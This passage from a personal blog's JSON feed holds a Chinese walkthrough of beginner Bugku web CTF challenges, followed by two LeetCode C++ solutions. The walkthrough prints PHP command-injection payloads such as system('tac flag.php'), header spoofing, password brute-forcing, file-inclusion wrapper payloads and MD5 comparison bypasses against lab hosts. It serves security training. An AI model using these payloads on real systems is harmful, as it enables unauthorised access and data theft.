限制，然后输入答案</p>\n<h1 id=\"GET\"><a href=\"#GET\" class=\"headerlink\" title=\"GET\"></a>GET</h1><p>GET 方式<br><code>?what=flag</code></p>\n<h1 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h1><p>POST<br><code>what=flag</code></p>\n<h1 id=\"矛盾\"><a href=\"#矛盾\" class=\"headerlink\" title=\"矛盾\"></a>矛盾</h1><p>PHP 弱类型比较<br><code>?num=1a</code></p>\n<h1 id=\"alert\"><a href=\"#alert\" class=\"headerlink\" title=\"alert\"></a>alert</h1><p>查看源码有 <code>&amp;#102$</code> 等字符，观察发现为 ascii 码</p>\n<ol>\n<li>python 脚本转字母</li>\n</ol>\n<pre><code class=\"python\">from locale import atoi\n\n\nstr = \"&amp;#102;&amp;#108;&amp;#97;&amp;#103;{&amp;#101;&amp;#52;&amp;#55;&amp;#101;&amp;#52;&amp;#100;&amp;#101;&amp;#98;&amp;#53;&amp;#102;&amp;#51;&amp;#53;&amp;#50;&amp;#50;&amp;#51;&amp;#97;&amp;#49;&amp;#51;&amp;#101;&amp;#50;&amp;#51;&amp;#54;&amp;#97;&amp;#50;&amp;#97;&amp;#50;&amp;#48;&amp;#53;&amp;#97;&amp;#97;&amp;#54;&amp;#99;}\"\n\nans = \"\"\ntemp = \"\"\nfor i in str:\n    if i &gt;= '0' and i &lt;= '9':\n        temp = temp + i\n    else:\n        if temp != \"\":\n            ans = ans + chr(atoi(temp))\n        temp = \"\"\nprint(ans)\n</code></pre>\n<ol start=\"2\">\n<li>将该内容复制到 html 文件中，打开运行得到 flag</li>\n</ol>\n<h1 id=\"你必须让他停下\"><a href=\"#你必须让他停下\" class=\"headerlink\" title=\"你必须让他停下\"></a>你必须让他停下</h1><p>bp 抓包，不断发送请求，当接收图片为 10.jpg 时，flag 出现</p>\n<h1 id=\"社工-初步收集\"><a href=\"#社工-初步收集\" class=\"headerlink\" title=\"社工 - 初步收集\"></a>社工 - 初步收集</h1><p>扫描目录，得到管理员登陆界面 /admin</p>\n<p>在网站后加 /admin，进入登录界面，需要账号密码</p>\n<p>wireshark 抓包，得到 user 和 pass，登录对应邮箱 (其中 pass 为授权码)</p>\n<p>在邮件里面可以推测其出生日期为 2001-02-06，名字为 mara</p>\n<p>尝试登陆，成功</p>\n<p>在网站信息的网站设置里的播放器 key 找到 flag</p>\n<pre><code class=\"raw\">flag{be4976dab90da6bc12e19988333e6d65}\n</code></pre>\n<h1 id=\"game1\"><a href=\"#game1\" class=\"headerlink\" title=\"game1\"></a>game1</h1><p>点进网站，发现是一个游戏，查看源代码</p>\n<p>看见一部分 js 代码</p>\n<pre><code class=\"js\">function overShowOver() {\n    $('#modal').show()\n    $('#over-modal').show()\n    if (window.XMLHttpRequest)\n    {// IE7+, Firefox, Chrome, Opera, Safari 浏览器执行\n            xmlhttp=new XMLHttpRequest();\n    }\n    else\n    {// IE6, IE5 浏览器执行\n        xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n    xmlhttp.onreadystatechange=function()\n    {\n        if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)\n        {\n            document.getElementById(\"livesearch\").innerHTML=xmlhttp.responseText;\n            document.getElementById(\"livesearch\").style.border=\"1px solid #A5ACB2\";\n        }\n    }\n    var ppp='36.161.119.168';\n    var sign = Base64.encode(score.toString());\n    xmlhttp.open(\"GET\",\"score.php?score=\"+score+\"&amp;ip=\"+ppp+\"&amp;sign=\"+sign,true);\n    xmlhttp.send();\n    $('#over-zero').show()\n  }\n</code></pre>\n<p>其中</p>\n<pre><code class=\"js\">var ppp='36.161.119.168';\n    var sign = Base64.encode(score.toString());\n    xmlhttp.open(\"GET\",\"score.php?score=\"+score+\"&amp;ip=\"+ppp+\"&amp;sign=\"+sign,true);\n</code></pre>\n<p>表明游戏结束会打开一个网站，其中 sign 为 score 的 base64 编码<br>使用 bp 抓包尝试</p>\n<pre><code class=\"raw\">score=25` 时 `sign=zMMjU===` , 试着去 base64 编码 `25` ，得到 `MjU=` ，那么可以得到该代码之后访问的网站\n`sign='zM'+base64(score)+'=='\n</code></pre>\n<p>所以将 score 改为一个较大的数，并 base64 编码一同修改</p>\n<p>如 payload:</p>\n<pre><code class=\"raw\">/score.php?score=9999999999999999&amp;ip=36.161.119.168&amp;sign=zMOTk5OTk5OTk5OTk5OTk5OQ====\n</code></pre>\n<p>得到 flag</p>\n<pre><code class=\"raw\">flag{bb984484a205a94c98c9723ba6a4207f}\n</code></pre>\n<h1 id=\"网站被黑\"><a href=\"#网站被黑\" class=\"headerlink\" title=\"网站被黑\"></a>网站被黑</h1><p>御剑扫描，发现有 shell.php 页面，<br><img data-src=\"/../../post_images/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91_1.jpg\" alt=\"网站被黑_1\"></p>\n<p>进入，看到的是一个登陆界面，需要密码<br><img data-src=\"/../../post_images/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91_4.jpg\" alt=\"网站被黑_4\"></p>\n<p>burp 抓包爆破，查看内容的变化</p>\n<p>最终发现当 <code>pass=hack</code> 时变化<br><img data-src=\"/../../post_images/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91_2.jpg\" alt=\"网站被黑_1\"></p>\n<p>查看返回，得到 flag<br><img data-src=\"/../../post_images/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91_3.jpg\" alt=\"网站被黑_3\"></p>\n<pre><code class=\"raw\">flag{a3995611f49389f396e0f99bf88a35ae}\n</code></pre>\n<h1 id=\"本地管理员\"><a href=\"#本地管理员\" class=\"headerlink\" title=\"本地管理员\"></a>本地管理员</h1><p>查看源码，发现注释中有一串字符串，有===, 很明显是 base64 编码，解码后得到 <code>test123</code><br>猜测为密码，尝试用户名 <code>user=admin,pass=test123</code> 登录</p>\n<p>返回<br><code>IP禁止访问，请联系本地管理员登陆，IP已被记录.</code></p>\n<p>ip 想到 <code>X-forwarded-for</code> ，于是抓包，添加上</p>\n<pre><code>X-forwarded-for: 127.0.0.1\n</code></pre>\n<p>得到 flag<br><img data-src=\"/../../post_images/%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98.jpg\" alt=\"本地管理员\"></p>\n<pre><code>flag{b5a7dd126ce2ecfb118adc117ba99eac}\n</code></pre>\n<h1 id=\"bp\"><a href=\"#bp\" class=\"headerlink\" title=\"bp\"></a>bp</h1><p>题目提示为弱密码 top1000，并且为 <code>z?????</code> 格式，所以说直接开启 bp 爆破</p>\n<p>但结束后发现每个返回的长度都相同<br><img data-src=\"/../../post_images/bp_1.jpg\" alt=\"bp_1\"></p>\n<p>猜测正确或者错误均返回相同的长度</p>\n<p>随便点进一个返回，看到以下代码</p>\n<pre><code class=\"js\">&lt;script&gt;\n    var r = {code: 'hacker1000'}\n    if(r.code == 'bugku10000'){\n        console.log('e');\n        document.getElementById('d').innerHTML = \"Wrong account or password!\";\n    }else{\n        console.log('0');\n        window.location.href = 'success.php?code='+r.code;\n    }\n  \n&lt;/script&gt;\n</code></pre>\n<p>也就是说当 <code>r.code == 'bugku10000'</code> 时，肯定返回 <code>Wrong account or password!</code></p>\n<p>那么成功时 <code>r</code> 的初始化一定不为 <code>{code: 'hacker1000'}</code> , 所以使用 <code>bp</code> 的 <code>option</code> 里的 <code>grep match</code></p>\n<p>添加 <code>{code: 'bugku10000'}</code></p>\n<p><img data-src=\"/../../post_images/bp_2.jpg\" alt=\"bp_2\"></p>\n<p>再导入 top1000 密码<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RwbTEyMzQ1L3dlYWstcGFzc3dvcmQ=\">（top1000 密码下载）</span></p>\n<p>开始爆破，此时主要观察 <code>{code: 'hacker1000'}</code> 这一项<br><img data-src=\"/../../post_images/bp_3.jpg\" alt=\"bp_3\"></p>\n<p>结束后点击该栏，升序排列，看到一个没有匹配到的</p>\n<p><img data-src=\"/../../post_images/bp_4.jpg\" alt=\"bp_4\"></p>\n<p>左移，发现密码为 <code>zxc123</code><br><img data-src=\"/../../post_images/bp_5.jpg\" alt=\"bp_5\"></p>\n<p>返回题目登录页面，输入密码登录，得到 flag</p>\n<pre><code class=\"raw\">flag{8712125af824e22608e155d2ca8f67c4}\n</code></pre>\n<h1 id=\"eval\"><a href=\"#eval\" class=\"headerlink\" title=\"eval\"></a>eval</h1><p>简单的 eval</p>\n<pre><code class=\"php\">&lt;?php\n    include \"flag.php\";\n    $a = @$_REQUEST['hello'];\n    eval( \"var_dump($a);\");\n    show_source(__FILE__);\n?&gt;\n</code></pre>\n<p>首先输入 <code>?hello=$flag</code> 尝试直接输出 flag<br>返回<br><img data-src=\"/../../post_images/eval_1.jpg\" alt=\"eval_1\"></p>\n<p>猜测对 flag 进行了隐藏<br>直接打开 flag.php, <code>?hello=system('tac flag.php')</code><br>得到:<br><img data-src=\"/../../post_images/eval_2.jpg\" alt=\"eval_2\"></p>\n<pre><code class=\"raw\">flag{e0c34bbc008b57b8d6127d252a636d3f}\n</code></pre>\n<h1 id=\"变量-1\"><a href=\"#变量-1\" class=\"headerlink\" title=\"变量 1\"></a>变量 1</h1><pre><code class=\"php\">if(!preg_match(\"/^\\w+$/\",$args)){\n    die(\"args error!\");\n}\neval(\"var_dump($$args);\");\n</code></pre>\n<p>其中正则表达式 <code>/^\\w+$/</code> 的大致意思为限定一个任意长字符串，全部由字母数字组成，前面中间后面都不能有空格、标点等符号，之后通过 var_dump 输出<br>提示 flag 在变量中，输入全局变量，由于有两个 <code>$</code> ，故这里只需输入 <code>GLOBALS</code><br><code>?args=GLOBALS</code><br>得到 flag<br><img data-src=\"/../../post_images/%E5%8F%98%E9%87%8F1.jpg\" alt=\"变量1\">]</p>\n<pre><code class=\"raw\">flag{54cb507b6f6f822cd2d083cec132f76f}\n</code></pre>\n<h1 id=\"头等舱\"><a href=\"#头等舱\" class=\"headerlink\" title=\"头等舱\"></a>头等舱</h1><p>头等舱想到响应头，F12 查看，果然找到 flag<br><img data-src=\"/../../post_images/%E5%A4%B4%E7%AD%89%E8%88%B1.jpg\" alt=\"头等舱\"></p>\n<pre><code class=\"raw\">flag{fb0775144c3bb36e835dc6ddb950ccc6}\n</code></pre>\n<h1 id=\"source\"><a href=\"#source\" class=\"headerlink\" title=\"source\"></a>source</h1><p>git 源码泄露</p>\n<pre><code class=\"bash\">wget -r http://114.67.175.224:15555/.git\n</code></pre>\n<p>下载所有文件 (使用 githacker 下不全)</p>\n<p>git log 发现只有两个，切换分支后发现没有 flag</p>\n<p><code>git show</code> 查看历史版本</p>\n<p>然后 git show xxx 一个一个查看具体信息，最后得到 flag</p>\n<h1 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h1><p>根据提示，查看源代码，发现一段 script，将 eval 修改为 alert，发现返回这么一串代码</p>\n<pre><code class=\"js\">function checkSubmit() {\n            var a = document.getElementById(\"password\");\n            if (\"undefined\" != typeof a) {\n                if (\"67d709b2b54aa2aa648cf6e87a7114f1\" == a.value)\n                    return !0;\n                alert(\"Error\");\n                a.focus(); return !1\n            }\n        }\n        document.getElementById(\"levelQuest\").onsubmit = checkSubmit;\n</code></pre>\n<p>那么在输入框中输入<br><code>67d709b2b54aa2aa648cf6e87a7114f1</code></p>\n<p>得到 flag</p>\n<pre><code class=\"raw\">flag{af05e5097b0e2701af012aba518d1ed4}\n</code></pre>\n<h1 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h1><p>显示一个点击链接，点进去，发现没有 flag，同时可以观察到多了 file 的值，猜测通过 file 进行文件包含</p>\n<p>尝试使用 php 伪协议包含 flag.php， <code>php://filter/convert.base64-encode/resource=flag.php</code> 发现无回显，那么该目录下应该没有 flag.php 文件</p>\n<p>再尝试读取 index.php，查看源代码是什么， <code>php://filter/convert.base64-encode/resource=index.php</code></p>\n<p>解码得到的 base64，得</p>\n<pre><code class=\"html\">&lt;html&gt;\n    &lt;title&gt;Bugku-web&lt;/title&gt;\n    \n&lt;?php\n    error_reporting(0);\n    if(!$_GET[file]){echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';}\n    $file=$_GET['file'];\n    if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n        echo \"Oh no!\";\n        exit();\n    }\n    include($file); \n//flag:flag{0f6064331e3faa311334c2e883696090}\n?&gt;\n&lt;/html&gt;\n</code></pre>\n<p>注释中直接有 flag</p>\n<p>看一下源代码</p>\n<p><code>strstr</code> : 查找字符串的首次出现<br><code>stristr</code> : <code>strstr()</code> 函数的忽略大小写版本<br><code>返回值</code> ：返回字符串的一部分或者 false（如果未发现 needle）。</p>\n<h1 id=\"好像需要密码\"><a href=\"#好像需要密码\" class=\"headerlink\" title=\"好像需要密码\"></a>好像需要密码</h1><p>提示为 5 为数密码，直接 bp 爆破</p>\n<p>bp 查看返回的长度，发现当密码为 <code>12468</code> 返回的长度不一样，点击查看返回</p>\n<p>得到 flag</p>\n<pre><code class=\"raw\">flag{37bb786f71fdf0649700bf9e313dcd19}\n</code></pre>\n<h1 id=\"备份是个好习惯\"><a href=\"#备份是个好习惯\" class=\"headerlink\" title=\"备份是个好习惯\"></a>备份是个好习惯</h1><p>既然是备份，那么将备份文件名试一下</p>\n<p>最终 <code>index.php.bak</code>成功，得到源码</p>\n<pre><code class=\"php\">&lt;?php\n/**\n * Created by PhpStorm.\n * User: Norse\n * Date: 2017/8/6\n * Time: 20:22\n*/\n\ninclude_once \"flag.php\";\nini_set(\"display_errors\", 0);\n$str = strstr($_SERVER['REQUEST_URI'], '?');\n$str = substr($str,1);\n$str = str_replace('key','',$str);\nparse_str($str);\necho md5($key1);\n\necho md5($key2);\nif(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){\n    echo $flag.\"取得flag\";\n}\n?&gt;\n</code></pre>\n<p>由代码可知，若要获得 flag，那么传入的 key1 和 key2 的 md5 值要相等，这里采用数组绕过</p>\n<p>由于有 <code>str_replace</code> ，将 key 变为空，故利用双写绕过<br>payload: <code>?kekeyy1[]=1&amp;kekeyy2[]=2</code></p>\n<p>得到 flag</p>\n<pre><code class=\"raw\">flag{2c2337eafcf0c6e287e40f8c76b22afa}\n</code></pre>\n<h1 id=\"cookies\"><a href=\"#cookies\" class=\"headerlink\" title=\"cookies\"></a>cookies</h1><p>进入网站，发现显示了一长串字母，查看源码，没有特别的<br>注意到构造 url 的参数，line 和 filename，</p>\n<pre><code class=\"raw\">http://114.67.175.224:15584/index.php?line=&amp;filename=a2V5cy50eHQ=\n</code></pre>\n<p>很明显，filename 的参数为 base64 形式，解码后发现为 keys.txt<br>尝试改为 index.php 的 base64 编码，提交后查看源码，发现只有 <code>&lt;?php</code> , 猜测为 line 的影响，修改 line 的值，可以逐一看到源码</p>\n<pre><code class=\"php\">&lt;?php\n\n\n\n\nerror_reporting(0);\n\n$file = base64_decode(isset($_GET['filename']) ? $_GET['filename'] : \"\");\n\n$line = isset($_GET['line']) ? intval($_GET['line']) : 0;\n\nif ($file == '') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");\n\n$file_list = array(\n\n    '0' =&gt; 'keys.txt',\n\n    '1' =&gt; 'index.php',\n\n);\n\n\n\nif (isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin'] == 'margin') {\n\n    $file_list[2] = 'keys.php';\n}\n\n\n\nif (in_array($file, $file_list)) {\n\n    $fa = file($file);\n\n    echo $fa[$line];\n}\n</code></pre>\n<p>由源码可知，flag 在 <code>keys.php</code> 内，为了能执行最后一块，那么需要<br><code>$_COOKIE['margin'] == 'margin'</code> , 传入 cookie 值，并将 filename 修改为 keys.php 的 base64 编码，提交后查看源码，得到 flag</p>\n<pre><code class=\"raw\">flag{5686274e37e29ac7999f85d59e38ad42}\n</code></pre>\n<h1 id=\"never-give-up\"><a href=\"#never-give-up\" class=\"headerlink\" title=\"never_give_up\"></a>never_give_up</h1><p>查看源码，只有一个 <code>1p.html</code> 的注释，先记住<br>尝试修改 url 中的 id 值，发现没有什么变化，将 hello.php 修改为 index.php，尝试是否能读取首页<br>然而发现还是跳转道 hello.php 中，bp 抓包尝试访问 index.php, 发现<br><img data-src=\"/../../post_images/never_give_up_1.jpg\" alt=\"never_give_up_1\"></p>\n<p>为 302 跳转，但 index.php 只有一个 <code>1p.html</code> 的注释，所以接下来尝试访问 <code>1p.html</code></p>\n<p>修改 url <code>http://114.67.175.224:16423/1p.html</code> ，发现跳转到了 bugku 的论坛网站，于是再次尝试 bp 抓包</p>\n<p>抓包拦截后可以发现，请求地址和 host 都被改了<br><img data-src=\"/../../post_images/never_give_up_2.jpg\" alt=\"never_give_up_2\"></p>\n<p>将地址改为 <code>/1p.html</code> ,host 修改为题目的地址，如<br><img data-src=\"/../../post_images/never_give_up_3.jpg\" alt=\"never_give_up_3\"></p>\n<p>重新发送，得到源码</p>\n<pre><code class=\"html\">HTTP/1.1 200 OK\nDate: Tue, 31 May 2022 00:45:11 GMT\nServer: Apache/2.4.7 (Ubuntu)\nLast-Modified: Mon, 14 Dec 2020 06:20:58 GMT\nETag: \"4ef-5b666a5322680-gzip\"\nAccept-Ranges: bytes\nVary: Accept-Encoding\nContent-Length: 1263\nConnection: close\nContent-Type: text/html\n\n&lt;HTML&gt;\n&lt;HEAD&gt;\n&lt;SCRIPT LANGUAGE=\"Javascript\"&gt;\n&lt;!--\n\n\nvar Words =\"%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E\" \nfunction OutWord()\n{\nvar NewWords;\nNewWords = unescape(Words);\ndocument.write(NewWords);\n} \nOutWord();\n// --&gt;\n&lt;/SCRIPT&gt;\n&lt;/HEAD&gt;\n&lt;BODY&gt;\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n</code></pre>\n<p>观察源码，可知为 js 产生的跳转，但发现跳转后还有一串字符，复制，尝试 base64 解码</p>\n<p>原字符串</p>\n<pre><code class=\"raw\">JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF\n</code></pre>\n<p>base64 解码后</p>\n<pre><code class=\"raw\">%22%3Bif(!%24_GET%5B'id'%5D)%0A%7B%0A%09header('Location%3A%20hello.php%3Fid%3D1')%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B'id'%5D%3B%0A%24a%3D%24_GET%5B'a'%5D%3B%0A%24b%3D%24_GET%5B'b'%5D%3B%0Aif(stripos(%24a%2C'.'))%0A%7B%0A%09echo%20'no%20no%20no%20no%20no%20no%20no'%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C'r')%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E\n</code></pre>\n<p>明显为 url 编码，故 url 解码</p>\n<pre><code class=\"php\">\";if(!$_GET['id'])\n{\n    header('Location: hello.php?id=1');\n    exit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n    echo 'no no no no no no no';\n    return ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n    $flag = \"flag{***********}\"\n}\nelse\n{\n    print \"never never never give up !!!\";\n}\n\n\n?&gt;\n</code></pre>\n<p>至此得到了 index.php 源码<br>需要绕过的三个点</p>\n<pre><code class=\"php\">if(!$_GET['id'])\nif(stripos($a,'.'))\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n</code></pre>\n<ol>\n<li>id 必须设置值</li>\n<li>a 中的 <code>.</code> 不能在开头以外的位置</li>\n<li>id==0, 此为弱类型比较，data 为 “bugku is a nice plateform!” 值，b 的长度大于 5，b 要满足’111’接上 b 的首个字符是’1114’的通配，b 的第一位不能是 4</li>\n</ol>\n<p>第一个比较简单，为了与下面的判断对应，id=0d 即可，第二个要么不出现 <code>.</code> ，要么以 <code>.</code> 开头<br>第三个需要使 data=bugku is a nice plateform!,data 由 file_get_contents 得到，这里可以采用 data 伪协议写入 bugku is a nice plateform!<br>也可以使用 input 输入值，传入的 b 的长度大于 5，并且要使第一位是 4 又不是 4，这里可以采用 %00 截断</p>\n<p>故 payload 为:</p>\n<pre><code class=\"raw\">http://114.67.175.224:16423/index.php?id=0d&amp;a=php://input&amp;b=%00411111  (此方法须在 bp 上抓包输入 bugku is a nice plateform!，或者使用 py 的 requests\n\nhttp://114.67.175.224:16423/index.php?id=0d&amp;a=data://text/plain,bugku is a nice plateform!&amp;b=%00411111\n\nhttp://114.67.175.224:16423/index.php?id=0d&amp;a=data://text/plain;base64,YnVna3UgaXMgYSBuaWNlIHBsYXRlZm9ybSE=&amp;b=%00411111\n</code></pre>\n<p>得到 flag</p>\n<pre><code>flag{2954b1fb45d4d8b60df146eb0cb43a37}\n</code></pre>\n<h1 id=\"shell\"><a href=\"#shell\" class=\"headerlink\" title=\"shell\"></a>shell</h1><p>payload: <code>s=system('ls');?s=system('tac flaga15808abee46a1d5.txt')</code></p>\n<h1 id=\"ez-java-serialize\"><a href=\"#ez-java-serialize\" class=\"headerlink\" title=\"ez_java_serialize\"></a>ez_java_serialize</h1>",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b6465ced/",
            "url": "http://dpm12345.cn/posts/b6465ced/",
            "title": "两数相加",
            "date_published": "2022-03-18T15:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9hZGQtdHdvLW51bWJlcnMv\">两数相加</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.jpg\"></p>\n<h2 id=\"不带头节点\"><a href=\"#不带头节点\" class=\"headerlink\" title=\"不带头节点\"></a>不带头节点</h2><pre><code class=\"cpp\">/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode() : val(0), next(nullptr) {}\n *     ListNode(int x) : val(x), next(nullptr) {}\n *     ListNode(int x, ListNode *next) : val(x), next(next) {}\n * };\n */\nclass Solution {\npublic:\n    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) {\n        ListNode* ans = nullptr;               // 开始节点\n        ListNode* tail = nullptr;              // 尾节点\n        int add = 0;                           // 进位\n        while(l1!=nullptr||l2!=nullptr)\n        {\n            int m = l1? l1 -&gt;val : 0;\n            int n = l2? l2 -&gt;val : 0;\n            int num = (m + n + add) %10;       // 个位数\n            add = (m + n + add)/10;            // 进位\n            if(!ans)                           \n            {                                  \n                ans = tail = new ListNode(num);\n            }\n            else\n            {\n                tail -&gt; next = new ListNode(num);\n                tail = tail -&gt; next;\n            }\n\n            if(l1)\n                l1 = l1 -&gt; next;\n            if(l2)\n                l2 = l2 -&gt; next;\n        }\n        if(add)                                // 如果还有进位，那么应该再创建一个节点\n            tail -&gt;next = new ListNode(add);\n        return ans;\n    }\n};\n</code></pre>\n<h2 id=\"带头结点-省去了无节点情况的考虑代码\"><a href=\"#带头结点-省去了无节点情况的考虑代码\" class=\"headerlink\" title=\"带头结点 (省去了无节点情况的考虑代码)\"></a>带头结点 (省去了无节点情况的考虑代码)</h2><pre><code class=\"cpp\">class Solution {\npublic:\n    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) {\n        ListNode* ans = new ListNode(-1);       //ans-&gt;next 为答案\n        ListNode* cnode = ans;                  // 遍历节点指针\n        int add = 0;                            // 进位\n        while(l1!=nullptr||l2!=nullptr)\n        {\n            int m = l1 ? l1 -&gt;val : 0;\n            int n = l2 ? l2 -&gt;val : 0;\n            int num = (m + n + add) %10;        // 个位数\n            add = (m + n + add)/10;             // 进位\n            cnode -&gt; next = new ListNode(num);  // 链接\n            cnode = cnode -&gt; next;              // 转移\n            if(l1)\n                l1 = l1 -&gt; next;\n            if(l2)\n                l2 = l2 -&gt; next;\n        }\n        if(add)\n            cnode -&gt;next = new ListNode(add);\n        return ans-&gt;next;\n    }\n};\n</code></pre>\n",
            "tags": [
                "哈希表",
                "链表"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d98ef1d2/",
            "url": "http://dpm12345.cn/posts/d98ef1d2/",
            "title": "两数之和",
            "date_published": "2022-03-18T14:54:40.000Z",
            "content_html": "<p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy90d28tc3VtLw==\">两数之和</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.jpg\"></p>\n<pre><code class=\"c++\">class Solution {\npublic:\n    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) {\n        unordered_map&lt;int,int&gt;temp;\n        for(int i=0;i&lt;nums.size();i++)\n        {\n            int num = nums[i];\n            if(temp.find(target-num)!=temp.end())\n                return {temp[target-num],i};\n            else\n                temp.insert({num,i});\n        }\n        return {};\n    }\n};\n</code></pre>\n",
            "tags": [
                "数组",
                "哈希表"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d10e2ef2/",
            "url": "http://dpm12345.cn/posts/d10e2ef2/",
            "title": "无重复字符的最长字串",
